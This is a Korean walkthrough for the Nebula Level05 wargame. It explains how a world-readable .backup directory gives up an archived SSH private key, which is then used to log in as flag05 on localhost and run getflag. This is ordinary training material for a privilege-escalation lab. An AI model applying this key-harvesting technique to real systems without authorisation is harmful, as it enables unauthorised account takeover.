# Exploit-exercise Nebula Level05
```
Check the flag05 home directory. You are looking for weak directory permissions

To do this level, log in as the level05 account with the password level05. Files for this level can be found in /home/flag05.
```

`flag05` 계정의 홈 디렉토리를 보면 보안에 취약한 폴더가 있다고 하네요.

`level05` 계정으로 로그인 한 뒤,
```
ls -al /home/flag05/
```

를 입력하여 디렉토리 안의 내용을 확인하면
```
total 9
drwxr-x--- 1 flag05 level05   80 2014-06-03 04:19 .
drwxr-xr-x 1 root   root     420 2012-08-27 07:18 ..
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
-rw------- 1 flag05 flag05    13 2014-06-03 04:19 .bash_history
-rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag05 flag05  3353 2011-05-18 02:54 .bashrc
drwx------ 2 flag05 flag05    60 2014-06-03 04:17 .cache
-rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile
drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh
```

다음과 같이 뜨는데, 이 때 `.backup` 디렉토리의 권한을 보면 others 부분에 r-x 가 되어있어서 읽기가 가능하다는 것을 알 수 있다.

그렇다면 한 번 `.backup` 디렉토리를 가져와서 안의 내용을 확인해본다.

```
cp -R /home/flag05/.backup/ ~/backup
cd ~
```

이제 `backup` 폴더를 보면

```
cd backup
ls
```
```
backup-19072011.tgz
```

`backup-19072011.tgz` 파일이 있고, 다음과 같이 압축을 풀어준다.

```
gzip -d ./backup-19072011.tgz
tar -xvf ./backup-19072011.tgz
```

이때 `tar` 명령어에서 `-v` 플래그를 함께 주었기에, 압축을 푸는 과정에서 파일들을 볼 수 있는데, 다음과 같은 출력 결과가 나온다.

```
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
```

`.ssh` 폴더를 백업해놨던 파일임을 알 수 있다.

그렇다면 이제 저 ssh 인증 키를 사용하여 로그인을 해보겠다.

```
ssh -i ./.ssh/id_rsa flag05@localhost
```

을 입력하면 (일부 환경에서는 `yes` 를 입력해야 하기도 한다.) flag05 계정으로 로그인이 되는 것을 볼 수 있다.

이제 `getflag` 를 입력하면

```
You have successfully executed getflag on a target account
```

라고 뜨면서 풀리게 된다.